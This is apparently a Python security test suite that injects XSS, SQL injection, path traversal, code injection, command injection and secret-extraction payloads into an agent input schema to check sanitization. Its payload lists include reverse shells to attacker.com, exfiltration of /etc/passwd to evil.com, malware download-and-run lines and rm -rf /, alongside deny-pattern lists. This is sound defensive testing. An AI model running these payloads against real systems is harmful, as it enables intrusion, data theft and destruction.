"""
Issue #1017 Security Vulnerability Tests: Input Sanitization - FIXED VERSION

CRITICAL SECURITY TEST SUITE: These tests are designed to FAIL initially to prove
security vulnerabilities exist in the agent_input field processing.

ENHANCEMENTS OVER ORIGINAL:
1. Proper SSOT inheritance with unittest compatibility for subTest functionality
2. Fixed test infrastructure issues
3. Clear vulnerability demonstration with failing assertions
4. Real services only - NO MOCKS in vulnerability testing

These tests specifically target:
1. Malicious payload injection in agent_input field
2. XSS (Cross-Site Scripting) vulnerability testing
3. SQL injection vulnerability testing
4. Path traversal vulnerability testing
5. Code injection vulnerability testing
6. System command injection vulnerability testing
7. API key extraction vulnerability testing

REQUIREMENTS:
- Tests MUST FAIL initially to prove vulnerabilities exist
- Uses SSOT test infrastructure from test_framework/ with unittest compatibility
- Real services only - NO MOCKS in vulnerability testing
- Follows testing best practices from reports/testing/TEST_CREATION_GUIDE.md

Business Value: Enterprise/Platform - Security compliance for HIPAA, SOC2, SEC regulations
"""

import json
import os
import sys
import uuid
import unittest
from typing import Any, Dict

from test_framework.ssot.base_test_case import SSotBaseTestCase
from netra_backend.app.schemas.agent_models import DeepAgentState


class Issue1017InputSanitizationFixedTests(SSotBaseTestCase, unittest.TestCase):
    """
    FIXED VERSION: Comprehensive security vulnerability tests for Issue #1017.

    These tests are designed to FAIL initially to prove that security
    vulnerabilities exist in the agent_input field processing.

    INFRASTRUCTURE FIXES:
    - Inherits from both SSotBaseTestCase and unittest.TestCase for full functionality
    - Provides subTest() functionality from unittest
    - Maintains SSOT environment isolation and metrics
    """

    def setUp(self):
        """Setup for each test method - unittest style."""
        super().setUp()  # Calls SSOT setup_method automatically
        self._setup_vulnerability_test_context()

    def setup_method(self, method):
        """Setup for each test method - pytest style."""
        super().setup_method(method)
        self._setup_vulnerability_test_context()

    def _setup_vulnerability_test_context(self):
        """Common setup for vulnerability testing."""
        # Create test context for vulnerability testing
        self.test_user_id = f"vuln_test_user_{uuid.uuid4().hex[:8]}"
        self.test_thread_id = f"vuln_test_thread_{uuid.uuid4().hex[:8]}"
        self.test_run_id = f"vuln_test_run_{uuid.uuid4().hex[:8]}"

        # Record business value metrics
        self.record_metric("test_category", "security_vulnerability")
        self.record_metric("issue_number", "1017")
        self.record_metric("vulnerability_type", "input_sanitization")

    def test_malicious_xss_payload_injection_vulnerability(self):
        """
        Test XSS payload injection in agent_input field.

        EXPECTS TO FAIL: This test should demonstrate XSS vulnerability
        by showing that malicious JavaScript payloads are not properly sanitized.
        """
        self.record_metric("vulnerability_subtype", "xss_injection")

        # Create malicious XSS payloads
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
            "'><script>alert('XSS')</script>",
            "\"><script>alert('XSS')</script>",
            "<iframe src='javascript:alert(\"XSS\")'></iframe>",
            "<object data='javascript:alert(\"XSS\")'></object>",
            "<embed src='javascript:alert(\"XSS\")'></embed>",
            "<form><button formaction='javascript:alert(\"XSS\")'>XSS</button></form>"
        ]

        for i, payload in enumerate(xss_payloads):
            with self.subTest(payload_index=i, payload=payload[:50]):
                # Create DeepAgentState with malicious XSS payload
                malicious_state = DeepAgentState(
                    user_request="Analyze this data",
                    user_id=self.test_user_id,
                    chat_thread_id=self.test_thread_id,
                    run_id=f"{self.test_run_id}_xss_{i}",
                    agent_input={
                        "analysis_type": payload,  # Inject XSS payload
                        "user_content": payload,   # Multiple injection points
                        "description": f"Normal content with {payload} embedded",
                        "config": {
                            "nested_field": payload,  # Test nested injection
                            "callback_url": f"https://evil.com?q={payload}"
                        }
                    }
                )

                # Convert to dict to simulate serialization/processing
                state_dict = malicious_state.model_dump()

                # VULNERABILITY CHECK: If this passes, the system is NOT sanitizing XSS
                # This assertion should FAIL to prove vulnerability exists
                self.assertNotIn("<script>", str(state_dict),
                    f"VULNERABILITY: XSS payload '{payload}' was not sanitized in state serialization")

                # Check agent_input field specifically
                agent_input_str = json.dumps(state_dict.get("agent_input", {}))
                self.assertNotIn("javascript:", agent_input_str,
                    f"VULNERABILITY: JavaScript URL '{payload}' was not sanitized in agent_input")

                # Check for HTML tag patterns
                html_tags = ["<script", "<img", "<svg", "<iframe", "<object", "<embed", "<form"]
                for tag in html_tags:
                    if tag in payload:
                        self.assertNotIn(tag, agent_input_str,
                            f"VULNERABILITY: HTML tag '{tag}' from payload '{payload}' was not sanitized")

    def test_sql_injection_vulnerability_in_agent_input(self):
        """
        Test SQL injection vulnerability in agent_input field.

        EXPECTS TO FAIL: This test should demonstrate SQL injection vulnerability
        by showing that SQL injection payloads are not properly sanitized.
        """
        self.record_metric("vulnerability_subtype", "sql_injection")

        # Create malicious SQL injection payloads
        sql_payloads = [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "' UNION SELECT * FROM sensitive_data --",
            "'; INSERT INTO logs VALUES ('hacked'); --",
            "' OR 1=1 UNION SELECT password FROM users --",
            "admin'--",
            "admin' /*",
            "' OR 'x'='x",
            "'; EXEC xp_cmdshell('format c:'); --",
            "1'; WAITFOR DELAY '00:00:10'; --"
        ]

        for i, payload in enumerate(sql_payloads):
            with self.subTest(payload_index=i, payload=payload[:50]):
                # Create DeepAgentState with malicious SQL payload
                malicious_state = DeepAgentState(
                    user_request="Query my data",
                    user_id=self.test_user_id,
                    chat_thread_id=self.test_thread_id,
                    run_id=f"{self.test_run_id}_sql_{i}",
                    agent_input={
                        "query_filter": payload,
                        "user_name": payload,
                        "search_term": payload,
                        "database_query": {
                            "where_clause": payload,
                            "order_by": payload
                        }
                    }
                )

                # Convert to dict to simulate database processing
                state_dict = malicious_state.model_dump()
                agent_input_str = json.dumps(state_dict.get("agent_input", {}))

                # VULNERABILITY CHECK: If this passes, SQL injection is possible
                # These assertions should FAIL to prove vulnerability exists
                sql_keywords = ["DROP TABLE", "UNION SELECT", "INSERT INTO", "EXEC xp_cmdshell", "WAITFOR DELAY"]
                for keyword in sql_keywords:
                    if keyword in payload:
                        self.assertNotIn(keyword, agent_input_str,
                            f"VULNERABILITY: SQL keyword '{keyword}' from payload '{payload}' was not sanitized")

                # Check for SQL injection patterns
                sql_patterns = ["'--", "' OR '", "'; ", "/*", "UNION"]
                for pattern in sql_patterns:
                    if pattern in payload:
                        self.assertNotIn(pattern, agent_input_str,
                            f"VULNERABILITY: SQL pattern '{pattern}' from payload '{payload}' was not sanitized")

    def test_path_traversal_vulnerability_in_agent_input(self):
        """
        Test path traversal vulnerability in agent_input field.

        EXPECTS TO FAIL: This test should demonstrate path traversal vulnerability
        by showing that directory traversal payloads are not properly sanitized.
        """
        self.record_metric("vulnerability_subtype", "path_traversal")

        # Create malicious path traversal payloads
        path_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "..%5C..%5C..%5Cwindows%5Csystem32%5Cconfig%5Csam",
            "../../../../../../../../etc/passwd%00.txt",
            "..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd",
            "/var/www/../../etc/passwd",
            "C:\\windows\\system32\\drivers\\etc\\hosts",
            "file:///etc/passwd"
        ]

        for i, payload in enumerate(path_payloads):
            with self.subTest(payload_index=i, payload=payload[:50]):
                # Create DeepAgentState with malicious path payload
                malicious_state = DeepAgentState(
                    user_request="Process this file",
                    user_id=self.test_user_id,
                    chat_thread_id=self.test_thread_id,
                    run_id=f"{self.test_run_id}_path_{i}",
                    agent_input={
                        "file_path": payload,
                        "config_file": payload,
                        "template_path": payload,
                        "upload_destination": payload,
                        "include_file": payload,
                        "backup_location": {
                            "path": payload,
                            "alternative": f"/safe/path/{payload}"
                        }
                    }
                )

                # Convert to dict to simulate file processing
                state_dict = malicious_state.model_dump()
                agent_input_str = json.dumps(state_dict.get("agent_input", {}))

                # VULNERABILITY CHECK: If this passes, path traversal is possible
                # These assertions should FAIL to prove vulnerability exists
                path_patterns = ["../", "..\\", "%2F", "%5C", "/etc/passwd", "system32"]
                for pattern in path_patterns:
                    if pattern in payload:
                        self.assertNotIn(pattern, agent_input_str,
                            f"VULNERABILITY: Path traversal pattern '{pattern}' from payload '{payload}' was not sanitized")

                # Check for sensitive file paths
                sensitive_paths = ["/etc/passwd", "system32", "hosts", "config/sam"]
                for path in sensitive_paths:
                    if path in payload:
                        self.assertNotIn(path, agent_input_str,
                            f"VULNERABILITY: Sensitive path '{path}' from payload '{payload}' was not blocked")

    def test_code_injection_vulnerability_in_agent_input(self):
        """
        Test code injection vulnerability in agent_input field.

        EXPECTS TO FAIL: This test should demonstrate code injection vulnerability
        by showing that code execution payloads are not properly sanitized.
        """
        self.record_metric("vulnerability_subtype", "code_injection")

        # Create malicious code injection payloads
        code_payloads = [
            "__import__('os').system('rm -rf /')",
            "eval('__import__(\"os\").system(\"whoami\")')",
            "exec('import subprocess; subprocess.call([\"rm\", \"-rf\", \"/\"])')",
            "${System.exit(1)}",
            "#{7*7}",
            "{{7*7}}",
            "<%= 7*7 %>",
            "${@import('os').system('id')}",
            "$(whoami)",
            "`whoami`",
            ";cat /etc/passwd;",
            "| nc attacker.com 4444",
            "&& curl http://evil.com/steal?data=",
            "'; import os; os.system('id'); #"
        ]

        for i, payload in enumerate(code_payloads):
            with self.subTest(payload_index=i, payload=payload[:50]):
                # Create DeepAgentState with malicious code payload
                malicious_state = DeepAgentState(
                    user_request="Execute this analysis",
                    user_id=self.test_user_id,
                    chat_thread_id=self.test_thread_id,
                    run_id=f"{self.test_run_id}_code_{i}",
                    agent_input={
                        "expression": payload,
                        "formula": payload,
                        "script_content": payload,
                        "command": payload,
                        "eval_string": payload,
                        "custom_logic": {
                            "calculation": payload,
                            "condition": payload
                        }
                    }
                )

                # Convert to dict to simulate code processing
                state_dict = malicious_state.model_dump()
                agent_input_str = json.dumps(state_dict.get("agent_input", {}))

                # VULNERABILITY CHECK: If this passes, code injection is possible
                # These assertions should FAIL to prove vulnerability exists
                dangerous_functions = ["__import__", "eval", "exec", "system", "subprocess", "os."]
                for func in dangerous_functions:
                    if func in payload:
                        self.assertNotIn(func, agent_input_str,
                            f"VULNERABILITY: Dangerous function '{func}' from payload '{payload}' was not sanitized")

                # Check for template injection patterns
                template_patterns = ["${", "#{", "{{", "<%=", "`", "$("]
                for pattern in template_patterns:
                    if pattern in payload:
                        self.assertNotIn(pattern, agent_input_str,
                            f"VULNERABILITY: Template injection pattern '{pattern}' from payload '{payload}' was not sanitized")

    def test_system_command_injection_vulnerability(self):
        """
        Test system command injection vulnerability in agent_input field.

        EXPECTS TO FAIL: This test should demonstrate command injection vulnerability
        by showing that system command payloads are not properly sanitized.
        """
        self.record_metric("vulnerability_subtype", "command_injection")

        # Create malicious command injection payloads
        command_payloads = [
            "; rm -rf /",
            "& del /f /s /q C:\\*",
            "| cat /etc/passwd",
            "&& wget http://evil.com/malware.sh -O - | sh",
            "; curl -X POST http://evil.com/exfiltrate -d @/etc/passwd",
            "` nc -e /bin/sh attacker.com 4444`",
            "$(/bin/bash -i >& /dev/tcp/attacker.com/4444 0>&1)",
            "; python -c \"import socket,subprocess,os;s=socket.socket()\"",
            "& powershell -enc aQBlAHgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQA",
            "|| nc -vlp 4444 -e /bin/bash"
        ]

        for i, payload in enumerate(command_payloads):
            with self.subTest(payload_index=i, payload=payload[:50]):
                # Create DeepAgentState with malicious command payload
                malicious_state = DeepAgentState(
                    user_request="Run system analysis",
                    user_id=self.test_user_id,
                    chat_thread_id=self.test_thread_id,
                    run_id=f"{self.test_run_id}_cmd_{i}",
                    agent_input={
                        "system_command": payload,
                        "shell_exec": payload,
                        "process_args": payload,
                        "script_params": payload,
                        "os_command": {
                            "cmd": payload,
                            "args": [payload, "normal_arg"]
                        }
                    }
                )

                # Convert to dict to simulate command processing
                state_dict = malicious_state.model_dump()
                agent_input_str = json.dumps(state_dict.get("agent_input", {}))

                # VULNERABILITY CHECK: If this passes, command injection is possible
                # These assertions should FAIL to prove vulnerability exists
                command_separators = [";", "&", "|", "&&", "||", "`", "$()"]
                for separator in command_separators:
                    if separator in payload:
                        self.assertNotIn(separator, agent_input_str,
                            f"VULNERABILITY: Command separator '{separator}' from payload '{payload}' was not sanitized")

                # Check for dangerous commands
                dangerous_commands = ["rm -rf", "del /f", "wget", "curl", "nc ", "bash", "powershell", "python -c"]
                for cmd in dangerous_commands:
                    if cmd in payload:
                        self.assertNotIn(cmd, agent_input_str,
                            f"VULNERABILITY: Dangerous command '{cmd}' from payload '{payload}' was not sanitized")

    def test_api_key_extraction_vulnerability(self):
        """
        Test API key extraction vulnerability in agent_input field.

        EXPECTS TO FAIL: This test should demonstrate that API keys and secrets
        can be injected and potentially extracted through agent_input processing.
        """
        self.record_metric("vulnerability_subtype", "api_key_extraction")

        # Create payloads designed to extract or expose API keys
        extraction_payloads = [
            "${env:API_KEY}",
            "${process.env.OPENAI_API_KEY}",
            "#{Rails.application.secrets.api_key}",
            "{{config.api_key}}",
            "<%=ENV['SECRET_KEY']%>",
            "${System.getenv('AWS_SECRET_ACCESS_KEY')}",
            "$API_KEY",
            "%API_KEY%",
            "{api_key}",
            "config['database_password']",
            "process.env['JWT_SECRET']",
            "os.environ.get('STRIPE_SECRET_KEY')"
        ]

        # Create fake secrets that should never be exposed
        fake_secrets = {
            "API_KEY": "sk-fake_openai_key_should_never_be_exposed_12345",
            "DATABASE_PASSWORD": "super_secret_db_password_123",
            "JWT_SECRET": "jwt_secret_key_that_should_be_protected",
            "AWS_SECRET_ACCESS_KEY": "fake_aws_secret_that_should_not_leak"
        }

        for i, payload in enumerate(extraction_payloads):
            with self.subTest(payload_index=i, payload=payload[:50]):

                # Temporarily set fake environment variables for testing
                with self.temp_env_vars(**fake_secrets):

                    # Create DeepAgentState with extraction payload
                    malicious_state = DeepAgentState(
                        user_request="Process configuration",
                        user_id=self.test_user_id,
                        chat_thread_id=self.test_thread_id,
                        run_id=f"{self.test_run_id}_extract_{i}",
                        agent_input={
                            "config_template": payload,
                            "api_config": payload,
                            "environment_var": payload,
                            "secret_ref": payload,
                            "credential_path": payload,
                            "template_data": {
                                "reference": payload,
                                "fallback": f"default_or_{payload}"
                            }
                        }
                    )

                    # Convert to dict and check for secret exposure
                    state_dict = malicious_state.model_dump()
                    agent_input_str = json.dumps(state_dict.get("agent_input", {}))

                    # VULNERABILITY CHECK: If this passes, secrets could be exposed
                    # These assertions should FAIL to prove vulnerability exists
                    for secret_name, secret_value in fake_secrets.items():
                        self.assertNotIn(secret_value, agent_input_str,
                            f"VULNERABILITY: Secret '{secret_name}' with value '{secret_value}' was exposed through payload '{payload}'")

                    # Check that extraction patterns are not processed
                    extraction_patterns = ["${", "#{", "{{", "<%=", "%", "process.env", "os.environ"]
                    for pattern in extraction_patterns:
                        if pattern in payload:
                            # If the pattern is still there, that could mean it wasn't processed (good)
                            # But if it's gone and secrets appear, that's a vulnerability
                            if pattern not in agent_input_str:
                                # Pattern was processed - check if any secrets leaked
                                for secret_value in fake_secrets.values():
                                    self.assertNotIn(secret_value, agent_input_str,
                                        f"VULNERABILITY: Pattern '{pattern}' was processed and secret leaked through payload '{payload}'")

    def test_nested_injection_vulnerability_complex_payloads(self):
        """
        Test complex nested injection vulnerabilities in agent_input field.

        EXPECTS TO FAIL: This test should demonstrate that complex nested payloads
        combining multiple vulnerability types are not properly sanitized.
        """
        self.record_metric("vulnerability_subtype", "nested_injection")

        # Create complex multi-vector payloads
        complex_payloads = [
            {
                "description": "<script>fetch('/api/secrets').then(r=>r.text()).then(d=>eval(d))</script>",
                "query": "'; DROP TABLE users; <img src=x onerror=eval('fetch(\"/api/admin\")')> --",
                "file_path": "../../../etc/passwd<script>alert('XSS')</script>",
                "command": "; curl http://evil.com/exfil?data=$(cat /etc/passwd | base64)"
            },
            {
                "nested": {
                    "deep": {
                        "injection": "__import__('os').system('rm -rf / && <script>alert(1)</script>')",
                        "sql": "' UNION SELECT password, ''; DROP TABLE users; --' FROM users WHERE id='<svg onload=alert(1)>'",
                        "path": "..\\..\\..\\windows\\system32\\config\\sam<iframe src='javascript:alert(1)'>"
                    }
                }
            },
            {
                "config": "${process.env.SECRET_KEY || eval('__import__(\\\"os\\\").system(\\\"whoami\\\")')}"
            }
        ]

        for i, payload_dict in enumerate(complex_payloads):
            with self.subTest(payload_index=i):
                # Create DeepAgentState with complex nested payload
                malicious_state = DeepAgentState(
                    user_request="Process complex data structure",
                    user_id=self.test_user_id,
                    chat_thread_id=self.test_thread_id,
                    run_id=f"{self.test_run_id}_complex_{i}",
                    agent_input=payload_dict
                )

                # Convert to dict to simulate processing
                state_dict = malicious_state.model_dump()
                agent_input_str = json.dumps(state_dict.get("agent_input", {}))

                # VULNERABILITY CHECK: Comprehensive checks for all attack vectors
                # These assertions should FAIL to prove vulnerabilities exist

                # XSS checks
                xss_patterns = ["<script>", "<img", "<svg", "<iframe", "javascript:", "onerror=", "onload="]
                for pattern in xss_patterns:
                    self.assertNotIn(pattern, agent_input_str,
                        f"VULNERABILITY: XSS pattern '{pattern}' was not sanitized in complex payload {i}")

                # SQL injection checks
                sql_patterns = ["DROP TABLE", "UNION SELECT", "' OR", "'--", "'; "]
                for pattern in sql_patterns:
                    self.assertNotIn(pattern, agent_input_str,
                        f"VULNERABILITY: SQL pattern '{pattern}' was not sanitized in complex payload {i}")

                # Path traversal checks
                path_patterns = ["../", "..\\", "/etc/passwd", "system32", "config/sam"]
                for pattern in path_patterns:
                    self.assertNotIn(pattern, agent_input_str,
                        f"VULNERABILITY: Path pattern '{pattern}' was not sanitized in complex payload {i}")

                # Command injection checks
                cmd_patterns = ["; curl", "rm -rf", "base64", "$(cat", "__import__", "eval("]
                for pattern in cmd_patterns:
                    self.assertNotIn(pattern, agent_input_str,
                        f"VULNERABILITY: Command pattern '{pattern}' was not sanitized in complex payload {i}")

                # Template injection checks
                template_patterns = ["${process.env", "${", "eval('"]
                for pattern in template_patterns:
                    self.assertNotIn(pattern, agent_input_str,
                        f"VULNERABILITY: Template pattern '{pattern}' was not sanitized in complex payload {i}")

    def tearDown(self):
        """Cleanup after each test method - unittest style."""
        try:
            # Record final vulnerability test metrics
            total_metrics = self.get_all_metrics()
            self.record_metric("total_vulnerability_tests_run", len([k for k in total_metrics.keys() if k.startswith("vulnerability_")]))
            self.record_metric("test_execution_time", self.get_metrics().execution_time)

        finally:
            super().tearDown()  # Calls SSOT teardown_method automatically

    def teardown_method(self, method):
        """Cleanup after each test method - pytest style."""
        try:
            # Record final vulnerability test metrics
            total_metrics = self.get_all_metrics()
            self.record_metric("total_vulnerability_tests_run", len([k for k in total_metrics.keys() if k.startswith("vulnerability_")]))
            self.record_metric("test_execution_time", self.get_metrics().execution_time)

        finally:
            super().teardown_method(method)